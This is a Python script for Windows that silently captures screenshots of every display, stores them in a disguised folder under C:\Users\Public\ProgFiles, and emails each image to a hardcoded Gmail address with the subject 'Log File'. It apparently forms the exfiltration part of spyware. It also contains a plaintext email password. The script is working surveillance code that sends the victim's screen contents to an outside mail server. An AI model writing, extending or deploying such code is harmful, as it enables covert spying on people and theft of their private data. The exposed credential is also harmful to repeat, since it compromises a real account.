import pyscreenshot as ImageGrab
import ctypes
import win32gui
import win32ui
import win32con
import win32api
from desktopmagic.screengrab_win32 import (
getDisplayRects, saveScreenToBmp, saveRectToBmp, getScreenAsImage,
getRectAsImage, getDisplaysAsImages)

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib


#########################################################


extend = "\\"
file_main = r"C:\Users\Public\ProgFiles"
file_path =  r"C:\Users\Public\ProgFiles\tmpFiles"
image_file_path = file_path + r"\Images"
numOfDisplays = 1

email_address = "ruben.heyse12@gmail.com"
password = "M1n3cr4?t"


#######################################################


# Send to email
def send_email(filename, attachment):
    # Source code from geeksforgeeks.org

    fromaddr = email_address
    toaddr = email_address

    # instance of MIMEMultipart
    msg = MIMEMultipart()

    # storing the senders email address
    msg['From'] = fromaddr

    # storing the receivers email address
    msg['To'] = toaddr

    # storing the subject
    msg['Subject'] = "Log File"

    # string to store the body of the mail
    body = "Body_of_the_mail"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = filename
    attachment = open(attachment, "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # attach the instance 'p' to instance 'msg'
    msg.attach(p)

    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()

    # Authentication
    s.login(fromaddr, password)

    # Converts the Multipart msg into a string
    text = msg.as_string()

    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    # terminating the session
    s.quit()

def screenshot():

    try:
	    long
    except NameError:
	    # Python 3
	    long = int

    def checkRect(rect):

        try:
            left, top, right, bottom = rect
        except ValueError:
            raise ValueError("%r is not a valid rect; must contain 4 ints" % (rect,))
        if not all(isinstance(x, (int, long)) for x in rect):
            raise ValueError("%r is not a valid rect; must contain 4 ints" % (rect,))
        width = right - left
        height = bottom - top
        if width <= 0 or height <= 0:
            raise ValueError("%r is not a valid rect; width and height must not be "
                "zero or negative" % (rect,))


    class RectFailed(Exception):
        pass


    def getVirtualScreenRect():
        # Note that one iteration of the loop takes about 2us on a Q6600.
        tries = 150
        lastRect = None
        for _ in range(tries):
            # Get dimensions of the entire virtual screen.  Note that left/top may be negative.
            # Any of these may return nonsense numbers during display configuration
            # changes (not just "desync" between our calls, but numbers that make little
            # sense, as if some Windows state doesn't change synchronously.)
            # This is why we get them at least twice.
            left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
            top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
            width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
            height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)

            right = left + width
            bottom = top + height

            rect = (left, top, right, bottom)
            try:
                checkRect(rect)
            except ValueError:
                lastRect = None
            else:
                if rect == lastRect:
                    return rect
                else:
                    lastRect = rect

        raise RectFailed("Could not get stable rect information after %d tries; "
            "last was %r." % (tries, lastRect))


    def getDisplayRects():
        HANDLE_MONITOR, HDC_MONITOR, SCREEN_RECT = range(3)

        # My experiments show this needs to be no more than 3 (for 4 iterations
        # through the loop), but use 150 in case there are pathological systems.
        # Note that one iteration of the loop takes about 90us on a Q6600.
        tries = 150
        lastRects = None
        for _ in range(tries):
            try:
                monitors = win32api.EnumDisplayMonitors(None, None)
            except SystemError:
                # If you are changing your monitor configuration while EnumDisplayMonitors
                # is enumerating the displays, it may throw SystemError.  We just try
                # again in this case.
                lastRects = None
            else:
                for m in monitors:
                    m[HDC_MONITOR].Close()
                rects = list(m[SCREEN_RECT] for m in monitors)
                try:
                    for rect in rects:
                        checkRect(rect)
                except ValueError:
                    lastRects = None
                else:
                    if rects == lastRects:
                        return rects
                    else:
                        lastRects = rects

        raise RectFailed("Could not get stable rect information after %d tries; "
            "last was %r." % (tries, lastRects))


    class GrabFailed(Exception):
        pass

    def deleteDCAndBitMap(dc, bitmap):
        dc.DeleteDC()
        handle = bitmap.GetHandle()
        # Trying to DeleteObject(0) will throw an exception; it can be 0 in the case
        # of an untouched win32ui.CreateBitmap()
        if handle != 0:
            win32gui.DeleteObject(handle)

    # In case someone rightfully imported the private helper before we made it public
    _deleteDCAndBitMap = deleteDCAndBitMap


    def getDCAndBitMap(saveBmpFilename=None, rect=None):
        if rect is None:
            try:
                rect = getVirtualScreenRect()
            except RectFailed as e:
                raise GrabFailed("Error during getVirtualScreenRect: " + str(e))
            # rect is already checked
        else:
            checkRect(rect)

        left, top, right, bottom = rect
        width = right - left
        height = bottom - top

        hwndDesktop = win32gui.GetDesktopWindow()

        # Retrieve the device context (DC) for the entire virtual screen.
        hwndDevice = win32gui.GetWindowDC(hwndDesktop)
        ##print("device", hwndDevice)
        assert isinstance(hwndDevice, (int, long)), hwndDevice

        mfcDC  = win32ui.CreateDCFromHandle(hwndDevice)
        try:
            saveDC = mfcDC.CreateCompatibleDC()
            saveBitMap = win32ui.CreateBitmap()
            # Above line is assumed to never raise an exception.
            try:
                try:
                    saveBitMap.CreateCompatibleBitmap(mfcDC, width, height)
                except (win32ui.error, OverflowError) as e:
                    raise GrabFailed("Could not CreateCompatibleBitmap("
                        "mfcDC, %r, %r) - perhaps too big? Error was: %s" % (width, height, e))
                saveDC.SelectObject(saveBitMap)
                try:
                    saveDC.BitBlt((0, 0), (width, height), mfcDC, (left, top), win32con.SRCCOPY)
                except win32ui.error as e:
                    raise GrabFailed("Error during BitBlt. "
                        "Possible reasons: locked workstation, no display, "
                        "or an active UAC elevation screen. Error was: " + str(e))
                if saveBmpFilename is not None:
                    saveBitMap.SaveBitmapFile(saveDC, saveBmpFilename)
            except:
                deleteDCAndBitMap(saveDC, saveBitMap)
                # Let's just hope the above line doesn't raise an exception
                # (or it will mask the previous exception)
                raise
        finally:
            mfcDC.DeleteDC()

        return saveDC, saveBitMap


    class BITMAPINFOHEADER(ctypes.Structure):
        _fields_ = [
            ('biSize', ctypes.c_uint32),
            ('biWidth', ctypes.c_int),
            ('biHeight', ctypes.c_int),
            ('biPlanes', ctypes.c_short),
            ('biBitCount', ctypes.c_short),
            ('biCompression', ctypes.c_uint32),
            ('biSizeImage', ctypes.c_uint32),
            ('biXPelsPerMeter', ctypes.c_long),
            ('biYPelsPerMeter', ctypes.c_long),
            ('biClrUsed', ctypes.c_uint32),
            ('biClrImportant', ctypes.c_uint32)
        ]



    class BITMAPINFO(ctypes.Structure):
        _fields_ = [
            ('bmiHeader', BITMAPINFOHEADER),
            ('bmiColors', ctypes.c_ulong * 3)
        ]



    class DIBFailed(Exception):
        pass



    def getBGR32(dc, bitmap):
        bmpInfo = bitmap.GetInfo()
        width, height = bmpInfo['bmWidth'], bmpInfo['bmHeight']

        bmi = BITMAPINFO()
        ctypes.memset(ctypes.byref(bmi), 0x00, ctypes.sizeof(bmi))
        bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth = width
        bmi.bmiHeader.biHeight = height
        bmi.bmiHeader.biBitCount = 24
        bmi.bmiHeader.biPlanes = 1

        bufferLen = height * ((width * 3 + 3) & -4)
        pbBits = ctypes.create_string_buffer(bufferLen)

        ret = ctypes.windll.gdi32.GetDIBits(
            dc.GetHandleAttrib(),
            bitmap.GetHandle(),
            0,
            height,
            ctypes.byref(pbBits),
            ctypes.pointer(bmi),
            win32con.DIB_RGB_COLORS)
        if ret == 0:
            raise DIBFailed("Return code 0 from GetDIBits")

        assert len(pbBits.raw) == bufferLen, len(pbBits.raw)

        return pbBits.raw, (width, height)


    def _getRectAsImage(rect):
        try:
            # Pillow or PIL
            from PIL import Image
        except ImportError:
            # some old PIL installations
            import Image

        dc, bitmap = getDCAndBitMap(rect=rect)
        try:
            bmpInfo = bitmap.GetInfo()
            # bmpInfo is something like {
            # 	'bmType': 0, 'bmWidthBytes': 5120, 'bmHeight': 1024,
            # 	'bmBitsPixel': 32, 'bmPlanes': 1, 'bmWidth': 1280}
            ##print(bmpInfo)
            size = (bmpInfo['bmWidth'], bmpInfo['bmHeight'])

            if bmpInfo['bmBitsPixel'] == 32:
                # Use GetBitmapBits and BGRX if the bpp == 32, because
                # it's ~15% faster than the method below.
                data = bitmap.GetBitmapBits(True) # asString=True
                return Image.frombuffer(
                    'RGB', size, data, 'raw', 'BGRX', 0, 1)
            else:
                # If bpp != 32, we cannot use GetBitmapBits, because it
                # does not return a 24/32-bit image when the screen is at
                # a lower color depth.
                try:
                    data, size = getBGR32(dc, bitmap)
                except DIBFailed as e:
                    raise GrabFailed("getBGR32 failed. Error was " + str(e))
                # BGR, 32-bit line padding, origo in lower left corner
                return Image.frombuffer(
                    'RGB', size, data, 'raw', 'BGR', (size[0] * 3 + 3) & -4, -1)
        finally:
            deleteDCAndBitMap(dc, bitmap)


    def getScreenAsImage():
        return _getRectAsImage(None)


    def normalizeRects(rects):
        smallestX = min(rect[0] for rect in rects)
        smallestY = min(rect[1] for rect in rects)
        return list(
            (-smallestX + left,
            -smallestY + top,
            -smallestX + right,
            -smallestY + bottom) for left, top, right, bottom in rects
        )


    def getDisplaysAsImages():
        try:
            rects = getDisplayRects()
        except RectFailed as e:
            raise GrabFailed("Error during getDisplayRects: " + str(e))
        # im has an origin at (0, 0) in the top-left corner of the virtual screen,
        # but our `rect`s have a (0, 0) origin in the top-left corner of the main
        # display.  So we normalize all coordinates in the rects to be >= 0.
        normalizedRects = normalizeRects(rects)
        im = getScreenAsImage()

        return list(im.crop(rect) for rect in normalizedRects)

    def _demo():
        global numOfDisplays

        # Synchronized capture, entire virtual screen at once, cropped to one Image per display.
        for displayNumber, im in enumerate(getDisplaysAsImages(), 1):
            im.save(image_file_path + extend + 'screencapture_sync_display_%d.png' % (displayNumber,), format='png')
            numOfDisplays += 1

    if __name__ == "__main__":
        _demo()

screenshot()

for imageNumber in range(1, numOfDisplays):
        screenshot_information = 'screencapture_sync_display_%d.png' % (imageNumber)
        send_email(screenshot_information,image_file_path + extend + screenshot_information)
